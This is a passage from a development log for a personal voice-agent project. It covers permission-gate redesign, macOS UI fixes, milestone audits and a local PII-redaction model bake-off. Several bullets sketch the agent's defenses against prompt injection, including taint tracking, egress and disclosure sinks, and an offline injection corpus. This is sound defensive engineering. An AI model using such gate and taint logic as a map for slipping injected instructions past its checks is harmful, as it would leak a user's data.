  M12 outcome closure and M13 replay fixtures want the journal); M15–M17 are independent and
  opportunistic. Phase-range references updated M1–M13 → M1–M17.

### Friction-economy redesign — the user's limitation review → five binding rules (2026-07-20)

the user read the folded arc and asked the question a review should: which of these are limitations
dressed as improvements? Four held up (read-web→send label tax; abstention cold-start nag;
per-tool effect-adapter tax + preview beats on a voice agent; gate-interaction bugs — the class
the same day's live demos produced). His directive: don't note them, REDESIGN them away — and
don't blindly import internet conventions generalized past their assumptions into an n-of-1
system. The result is SPEC §"Cross-cutting architecture: the friction economy" — five rules that
bind M9–M17 (rule wins over phase text) — plus surgical amendments to M10/M12/M13/M14/M15.

The de-generalization table (what the internet shape assumes vs what Gumbo actually is):
- **FIDES per-value label lattices** assume multiple principals and arbitrary dataflow. Gumbo has
  ONE principal and ~5 egress sinks → provenance became a per-task source-set checked at sinks +
  a secret-containment check on outbound payloads; nothing plumbs through model context; the set
  resets per task, so label creep is structurally impossible. Informed-confirm (with source
  banner), not deny; the user's standing rules pre-approve his recurring flows.
- **Saga/2PC per-endpoint ceremony** assumes distributed services with lost-response ambiguity.
  Most Gumbo mutations are local and synchronous → effects attach to the FIVE CHANNELS
  (filesystem/browser/AX-script/provider-HTTP/connector-writes) with inherited
  preview/receipt/undo/verify; full COMMIT_UNKNOWN journaling only for remote commitments. New
  tools stay an-afternoon cheap — the report's per-tool EffectSpec interface is explicitly a
  rejected generalization.
- **Confidence-gates-actions** assumes fleet-scale caution is free. At n-of-1, cold-start
  pessimism = nagging → inverted to GRADUATION: day one equals today's gates exactly; track
  record can only loosen (inspect-first on no-track-record compensatables; "stop asking about
  this" drafts a standing rule the user approves). Autonomy expansion is always the user-approved,
  versioned, revocable. Track record never manufactures an ask.
- **Each-safety-feature-owns-behavior** is how the confirm×kill-switch Catch-22 happened →
  Rule 1: layers emit facts, ONE pure decide() maps them (auto | announce | confirm | deny), at
  most one prompt per action, input-requiring decisions drive the one stand-down bracket, and the
  interaction matrix is a table-driven test (enumerable facts → collisions become test failures,
  not live-demo surprises).
- **Heartbeat-vs-nothing monitoring** → Rule 5 (no silent negatives): local-model triage and
  channel-indexed intentions degrade to next-sweep late catches, never to nothing; coverage gaps
  stated at arm time.
- New decision tier: **announce** (act + one-sentence spoken receipt + standing "undo that") — the
  reversible majority of a voice agent's day gets ZERO added beats; previews are sentences
  (phrasing, not modals). Rule 2's rider closes the obvious exploit: information egress is
  irreversible-by-information regardless of local state (the M7 literal-URL rule generalized), so
  the auto/announce tiers stay injection-bounded to recoverable local state.

Committed as the same-day companion to the research fold; the fold's own entry above stands
unchanged.

## Dashboard polish session — first-open scroll, seamless titlebar, notch re-focus (2026-07-21)

Small live session with the user on main (dev servers + freshly rebuilt shell). Three UI fixes,
each verified live; one real OS finding worth recording.

- **Feed now opens at the newest entry.** The sentinel ref-callback stick only engaged within
  160 px of the bottom — but on first load the WS `bootstrap` backlog lands in ONE store update
  while the feed sits at scrollTop 0, so the stick never armed and the dashboard opened at the
  TOP of history. Fix: a `didFirstSnap` ref inside the same callback — unconditional
  `scrollIntoView` on the first render with visible rows, then the near-bottom stick takes over
  unchanged. Gate on `visible.length > 0`, not mount: at mount the store is still empty (backlog
  arrives after WS connect), so a mount-time snap is a no-op. Verified via Playwright:
  197-row load → scrollTop == maxScroll.
- **Titlebar deleted visually, not structurally.** `titleVisibility = .hidden` +
  `titlebarAppearsTransparent` + window background matched to the dashboard's `--bg` (#191411,
  index.css — cross-file coupling worth knowing). Deliberately NOT `.fullSizeContentView`: the
  GUMBO wordmark lives top-left exactly where the traffic lights sit, and full-bleed would also
  scroll feed text visibly under the lights. `window.title` stays set for Mission Control/a11y;
  the invisible strip still drags.
- **macOS 26 REFUSES to raise an already-on-screen window of a background app** — the notch
  click-catcher is a nonactivating panel (by design), so Gumbo is still inactive when
  `dashboard.show()` runs; `makeKeyAndOrderFront` + `orderFrontRegardless` + `activate` are ALL
  silently ignored for a visible-but-behind window. But a window freshly ADDED to the screen
  list is still granted front placement — which is why the FIRST notch press always worked and
  re-presses did nothing. Fix: `if window.isVisible && !NSApp.isActive { window.orderOut(nil) }`
  before `makeKeyAndOrderFront` — re-show through the placement path the OS still honors. No
  flicker (same window-server transaction), webview state intact. Guard kept narrow: when Gumbo
  IS active, plain makeKey works and the trick must not fire. This is workaround #3 for the
  macOS 26 activation regime (after the quick-text `.nonactivatingPanel` and the first-open
  `orderFrontRegardless`) — assume `NSApp.activate(ignoringOtherApps:)` is decorative on this OS.
- Composer placeholder → "Message Gumbo" (voice shipped; the old "voice arrives with the notch
  app" copy was stale). Also pruned stale DerivedData: disposed m6/m7 worktree caches deleted
  (~/Library DerivedData keys per absolute project path — worktree flows leak orphans), M8's
  kept (worktree live), main's shell rebuilt in place since its product predated the M7 merge.
- **Quit was doubly broken (same-day follow-up).** (1) The status-menu "Quit Gumbo" item
  existed but `menu.items.forEach { $0.target = self }` retargeted it at the AppDelegate,
  which doesn't implement `terminate(_:)` — auto-enablement sees a non-responding target and
  disables the item. Quit must keep a nil target so the responder chain reaches NSApp; only
  Open Dashboard gets an explicit target. (2) ⌘Q never worked anywhere: key equivalents
  resolve through `NSApp.mainMenu`, which an LSUIElement app never gets for free — installed a
  minimal invisible main menu holding just Quit. (Corollary for later: ⌘C/⌘V in the webview
  composer likely need an Edit menu the same way.)

## M9–M17 convergence fold — third audit pass + the user's cloud decision → SPEC amendments (2026-07-21)

A third audit of the M9–M17 arc (a capability audit, a critique of it, and a resolution) converged
and was folded into SPEC. Method as before: amend phases in place to the converged state cleanly;
reasoning + provenance recorded here, not in SPEC.

- **The load-bearing catch — the cloud model is itself a disclosure sink.** The Realtime orchestrator
  receives every tool result it reasons about, so connector content, injected memory, local-model
  summaries, and M17 extracted text reach OpenAI by construction; a source check *after* the tool
  call is too late. This was missed by the earlier passes (they trusted SPEC's "five egress sinks"
  framing) and re-derived by auditing the sink *categories*, not just their contents. Folded into
  Rule 4 (model ingress is a sink) and Rule 2 (disclosure, not HTTP method, is the irreversible
  axis).
- **the user's decision (2026-07-21): cloud processing ACCEPTED**, under a one-time per-connector/
  data-class standing grant, designed for **least disclosure** (OpenAI's own data-minimization
  guidance made structural). This collapses the hard branch: the local-private ORCHESTRATION lane is
  NOT built — it would be a second brain (local ASR + intent + reasoning + TTS), which §2 locks
  against and M15 forbids itself from being; and with cloud accepted it has no requirement to serve.
  M11 rewritten around the least-disclosure invariant (scope-at-source → project → progressive
  disclosure → daemon caps → local bulk-reduction → content-light audit); M15 reclassified from an
  offline/private tier to a **disclosure REDUCER** (its concrete first job = the M11 digest), which
  is the role that survives every objection under branch A.
- **Injection-defense: refined, not deferred wholesale.** The critique's "don't wait for a live
  miss" was accepted; the resolution sharpened the trigger to *demonstrated effectiveness against an
  offline corpus before shipping* (not "ship because injection is real" — which would have kept an
  in-band, model-mediated quarantine transform on injection grounds, contradicting the out-of-band
  thesis). Three mechanisms split: (a) tainted shell → a NARROWER backstop (taint is a fact feeding
  `decide()`, biting only on an *unclassified* effect; provably read-only/recoverable run even when
  tainted), not a separate "confirm every command" gate; (b) quarantine summarization → evaluate
  vs the corpus predeployment, never loosens a gate; (c) list-wise claim check → reclassified as
  research ACCURACY (deterministic "were these source IDs actually fetched" + a narrow semantic check
  for source-dependent reports), not injection defense, and never blocks a basic finished announce.
- **Other converged corrections:** compensation *cost* not category (free/reliable/immediate →
  announce); effect class per-ACTION not per-tool (`browser_act`); M9 always-in-context memory
  restricted to benign persona (sensitive retrieved on demand, so it doesn't pre-taint every task);
  the duplicate boolean `tainted` flag dropped (source-set supplies it); verbatim-URL provenance done
  STRUCTURALLY (did a tool observe the link?) not by byte-scanning task history; M12 explicit-arm-only
  (no generic "interesting-signal" watcher, no default X/news fan-out); M14 renamed off "universal
  undo," APFS demoted to a spike (touched-file backups + git temp refs ship first), generic browser
  submit records `unknown` + stops; M16 one-app-first + feasibility-gate + defer the inbound suite;
  M17 soft duration cap, drop capture hashes, remove PTT-time scene inference.
- **M13 demoted from a sequential milestone to cross-cutting learning/regression discipline**, its
  deliverables relocated with explicit owners (lessons + procedure promotion → M8; graduation → M10/
  M14; routing regression → tool-registry tests; injection corpus → M10/M14 gate tests; claim/source
  verification → the research-task contract). "Dissolve" meant delete the phase, keep every
  deliverable — a standalone "self-improvement" phase implied a user feature that isn't there.
- **Arc reframed** off "SOTA-completeness / both reports converged" as a build criterion → a
  personal-capability roadmap sequenced by vertical daily value (minimal M9 → first M11 connector →
  its one explicit M12 watch → M14 receipts/undo for the first mutating channel; provenance + effects
  added at each real sink/effect, not as broad read-only platform blocks). Research explains
  mechanisms; the the user-moment test sets scope.
- **The meta-lesson recorded:** three expert passes optimized the DESIGN of the local-private branch
  before anyone verified the NEED for it — the same failure the SOTA-completeness critique named, one
  level up. Asking the user the one collapsing question ("do you require never-cloud, or accept an
  ask-once policy?") was worth more than a fourth design round, and it retired an entire branch.

## M9–M17 capability trim — implementation boundaries made explicit (2026-07-21)

Applied the final 17-item audit trim to the planned milestones. `SPEC.md` now states only the current
design; this log keeps the audit provenance and reasons.

- **The roadmap now starts from the user's moments and the accepted cloud boundary.** Cloud-model
  ingress is a disclosure sink under a standing per-connector/data-class grant. Disclosure is
  classified by what reaches a new recipient, not by HTTP method, and Rule 3 promises cheap undo only
  where Gumbo mediates the operation: copy-on-first-write for files and a temp git ref for coding.
  APFS remains a proven-later upgrade.
- **M9/M10 shed speculative standing machinery.** Reflection runs only after a deterministic
  candidate check, sends only candidate logs, exposes undoable deltas, and creates no default daily
  summary. Standing-rule history replay is grow-on-need; activation stays one scoped, versioned,
  undoable card.
- **M11 separates a useful first connector from bulk-reduction infrastructure.** Base mail lookup
  uses scoped, capped snippets and a real read-only Gmail OAuth token held in macOS Keychain. Local
  bulk reduction waits for M15 and a measured volume, latency, cost, or disclosure problem.
- **M12 is a three-state personal intention ledger.** `ARMED → TRIGGERED → CLOSED` covers the named
  reminder/watch moments; sweeps promise only declared, connected channels. Receipt-backed outcome
  closure arrives with the relevant M14 action channel rather than pretending read-only watches can
  observe every result.
- **M14 promises receipts and undo only at executors Gumbo controls.** Every shell, browser,
  provider, and connector executor enforces the permit. Remote recovery journals exist only for
  mutating clients and keep the minimum recovery arguments; local filesystem undo covers intercepted
  writes, while opaque app/shell saves say undo is unavailable. The private-calendar demo now
  act-and-announces because deletion is immediate, reliable, and free to compensate.
- **M15's digest contract accounts for every input item.** It returns included/omitted IDs, counts,
  and a manifest, with capped source snippets reachable on demand; without that accounting Gumbo
  cannot claim no-loss reduction. Prompt-cache layout is ongoing provider discipline, not a reason to
  build a local-model phase.
- **M16 treats an opaque Shortcut as one declared effect.** Its identity, input schema, and maximum
  consequence are classified before invocation; its internals do not inherit Gumbo's gates or
  receipts. The first demo stays on one verified Things action, with Spotlight surfaces deferred.
- **M17 evidence matches the modality and the answer's limits.** Images retain the relevant crop and
  uncertainty; audio retains the analyzed time span and confidence. Raw media stays local while
  extracted text may reach Realtime under the standing grant, and the beep demo explicitly refuses
  to rule out an alarm from a short clip.

## M11/M15 local-reducer bake-off — Ornith oQ4 chosen on measured evidence (2026-07-21)

the user accepted cloud processing but directed the M11 bulk path through local reduce+redact first
(OpenAI's own data-minimization posture), and asked which of the on-disk 35B-A3B variants should be
the worker. Ran a task-shaped bake-off instead of trusting the existing coding gauntlets — that
choice was load-bearing: the June coding gauntlet ranked oQ8 first (10/10, ★4.8/5), but on the
actual reducer job oQ8 is the *worst* deploy pick. Generic benchmarks inverted the ranking.

- **Protocol:** 4 models × 2 tasks, greedy temp 0, thinking off, `mlx_lm` 0.31.3 from the LocalAI
  venv, M5 Pro 48 GB. T1 = 14-email synthetic inbox → strict-JSON digest + included/omitted
  manifest + placeholder redaction (12 planted PII values). T2 = 8-message thread → verbatim
  redaction + alias map, scored by byte-exact round-trip re-hydration. All fixtures synthetic;
  single greedy run per cell (small n, but the discriminating event aligned with the June
  cross-analysis's "Ornith is the more precise agent").
- **Result:** Ornith-1.0-35B-MLX-oQ4 won every axis that matters — ZERO leaks and the most complete
  redaction map (9/9 planted values incl. tracking number and card digits), perfect 14/14 manifest
  and triage, AND fastest (852 tok/s prefill / 86 tok/s decode) AND smallest (21.6 GB peak; 20 GB
  on disk). Full digest 13 s cold / ~9 s warm; thread redaction 7 s — inside the 15 s voice budget
  even cold. Base Qwen3.6-OptiQ-4bit leaked "card ending 7733" into a digest gist — the single
  discriminating quality event, and exactly the failure class a privacy reducer exists to prevent.
  Ornith 5-bit: clean but strictly dominated (slower, +4.5 GB, equal quality). oQ8: clean but
  disqualified — prefill 68 tok/s (stock qmm kernel, ~12× slower than oQ4's; quant format decides
  which kernels engage) makes a 1.3k-token prompt ~20 s before first token, and 38.2 GB peak leaves
  no headroom on a 48 GB always-alive machine.
- **T2 didn't discriminate — good news in itself:** all four scored 8/8 byte-exact round-trips with
  zero leaks and full alias coverage. Verbatim redaction-with-alias-map is safely below the
  capability floor of every candidate; model choice is decided by the digest job.
- **oQ4's one blemish drove a design decision:** it wrote `[ADDR_1]` where it meant `[ADDR_2]` in
  one gist (no leak; re-hydration would substitute the wrong address). Placeholder cross-referencing
  is exactly what a model is bad at and regex is perfect at → the pipeline orders the DETERMINISTIC
  redactor BEFORE the model (structured PII becomes placeholders before the model ever sees the
  text; the model owns only triage + gisting; a final deterministic sweep runs after). The bake-off
  made the model do both jobs; production splits the roles, so this slip class disappears.
- **`--chat-template-config '{"enable_thinking": false}'` honored by all four** (zero think tokens)
  — the no-reasoning production posture is real, not hoped-for. Without it, Qwen-family models
  think by default (validated on a tiny model first: tens of seconds and thousands of tokens).
- **Speculative decoding stays rejected, now with a measurement:** the user's own DFlash field test
  has the AEON draft at 0.96× on Ornith oQ4 (a loss) and 1.09× only on its training target (base
  Qwen). Same kernel, same policy — the variable is the fine-tune. Dead lever; recorded in M15's
  rejected list.
- **Serving = subprocess-per-job, not a resident server.** `mlx_lm.generate` per job means ZERO
  resident memory between jobs on a machine the user actively uses; the ~4 s load tax is already
  inside the measured 13 s cold budget. A resident `mlx_lm.server` (saves the load tax, pins
  ~21 GB) is a grow-on-need upgrade if digest cadence (e.g. the M12 morning brief) makes the tax
  felt.
- **Apple Foundation Models dropped as the M15 candidate.** The rationale for it was "smallest
  adequate on-device model, typed guided generation" — but a measured 35B-A3B agentic model already
  on the user's disk beats a ~3B dense model on the same job with acceptable latency and zero resident
  cost, and skipping the Swift-side runtime keeps the worker seam in the daemon where every other
  provider client lives. SPEC M15 now states the oQ4 design directly.
- Bake-off artifacts (fixtures, outputs, scorer) lived in the session scratchpad — ephemeral by
  design; the protocol above is enough to re-run against a future candidate.
